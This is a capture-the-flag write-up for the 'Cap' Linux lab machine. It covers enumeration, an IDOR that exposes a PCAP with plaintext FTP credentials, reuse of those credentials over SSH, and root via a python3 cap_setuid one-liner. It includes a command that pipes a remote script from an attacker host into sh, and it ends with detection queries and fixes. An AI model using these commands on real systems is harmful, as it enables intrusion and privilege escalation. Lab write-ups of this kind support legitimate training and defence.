<img width="224" height="224" alt="image" src="https://github.com/user-attachments/assets/d315b380-0621-4960-bdd5-b416c3c21c53" />

> Machine Information
> 
> Name: Cap
>
> IP: 10.10.10.245
>
> OS: Linux (Ubuntu)
>
> Difficulty: Easy

## Summary

Cap is a Linux machine running a security dashboard web application that 
performs network captures. Improper access controls on the capture download 
endpoint expose an IDOR vulnerability, allowing access to another user's PCAP 
file containing plaintext FTP credentials. Those credentials are reused for SSH 
access, and a misconfigured Linux capability on the Python binary allows for 
trivial privilege escalation to root.

**Attack Chain:** IDOR → PCAP Credential Extraction → SSH → Linux Capabilities (cap_setuid)

## Enumeration

### Nmap
```bash
nmap -sC -sV -p- cap.htb -oN cap_nmap
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn (Security Dashboard)
```

Three ports open — FTP, SSH, and an HTTP web application running Gunicorn. 
Tested FTP for anonymous access immediately, which was denied.
```bash
ftp cap.htb
Name: anonymous
530 Login incorrect.
```

SSH accepts password authentication, which is worth noting for later once 
credentials are obtained.

### Web Application — Gobuster

Ran Gobuster to enumerate directories on the web application:
```bash
gobuster dir -u cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Results:
```
/data       (Status: 302) --> http://cap.htb/
/ip         (Status: 200)
/netstat    (Status: 200)
/capture    (Status: 302) --> http://cap.htb/data/13
```

The `/capture` endpoint redirected to `/data/13` — a numbered ID referencing 
a packet capture file. This immediately suggests that other IDs may be 
accessible.

## Initial Access

### IDOR — Accessing Another User's PCAP

The `/data/13` endpoint contained a download button for a PCAP file. 
Noticing the numeric ID in the URL, I tested `/data/0` — the lowest 
possible value — which returned a different PCAP file belonging to another 
user. This is a classic **Insecure Direct Object Reference (IDOR)** 
vulnerability — the application uses a predictable, user-controlled ID 
with no access control validation.

Downloaded the file `0.pcap` and opened it in Wireshark.

### Credential Extraction — PCAP Analysis

Analyzed the packet capture and filtered for FTP traffic. Since FTP 
transmits credentials in plaintext, the username and password were clearly 
visible in the packet data:
```
Credentials: nathan : Buck3tH4TF0RM3!
```

### FTP Access

Tested the credentials against FTP:
```bash
ftp nathan@cap.htb
230 Login successful.
```

Listed files in the home directory and found `user.txt`.

### SSH Access

The same credentials worked over SSH:
```bash
ssh nathan@cap.htb
```

Confirmed user context:
```bash
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

Retrieved the user flag.

## Privilege Escalation

### Linux Capabilities — cap_setuid on Python3.8

Confirmed that both `curl` and `python3` were available on the system, 
then transferred and executed LinPEAS to enumerate privilege escalation 
vectors:
```bash
curl http://10.10.14.61:80/linpeas.sh | sh
```

LinPEAS identified two findings of interest — a potential pkexec exploit 
and a misconfigured capability on the Python binary. Checked GTFOBins 
for the Python capability abuse technique and confirmed that 
`/usr/bin/python3.8` had `cap_setuid` set, meaning it could arbitrarily 
change its process UID to 0 (root) without requiring sudo.

Executed the exploit:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
```bash
# whoami
root
```

Navigated to the root directory and retrieved the root flag:
```bash
cd /root
cat root.txt
```

## Detection

### What to Look For

| Event | Detection Opportunity |
|-------|----------------------|
| Sequential ID enumeration on `/data/` endpoint | Web server logs showing rapid requests to `/data/0`, `/data/1`, etc. from a single IP |
| FTP plaintext credential exposure | Network monitoring for FTP AUTH traffic — any FTP session on an untrusted network should alert |
| Python capability abuse | Process auditing for `python` spawning `/bin/sh` as UID 0 |

### Splunk Detection — IDOR Enumeration
```
index=web_logs uri_path="/data/*"
| rex field=uri_path "/data/(?<capture_id>\d+)"
| stats count by src_ip, capture_id
| where count > 3
| sort -count
```

## Key Takeaways

- **IDOR is a simple but devastating vulnerability** — any endpoint that 
  uses a predictable numeric ID to reference resources must enforce 
  ownership validation server-side. The fix here is a single access 
  control check confirming the requesting user owns the requested capture.
- **FTP should not be used to transmit credentials** — FTP sends all 
  data including usernames and passwords in cleartext. Any attacker 
  with the ability to capture network traffic on the same segment can 
  trivially extract credentials. SFTP or SCP should be used instead.
- **Linux capabilities are as dangerous as SUID bits** — `cap_setuid` 
  on an interpreter like Python effectively grants root access to anyone 
  who can execute it. Capabilities should be audited regularly using 
  `getcap -r / 2>/dev/null` and removed unless explicitly required.

## Tools Used

- Nmap
- Gobuster
- Wireshark
- LinPEAS
- FTP / SSH clients

## References

- [MITRE ATT&CK - IDOR / Forced Browsing T1083](https://attack.mitre.org/techniques/T1083/)
- [MITRE ATT&CK - Credentials in Network Traffic T1040](https://attack.mitre.org/techniques/T1040/)
- [MITRE ATT&CK - Linux Capabilities Abuse T1548.001](https://attack.mitre.org/techniques/T1548.001/)
- [GTFOBins - Python Capabilities](https://gtfobins.github.io/gtfobins/python/)
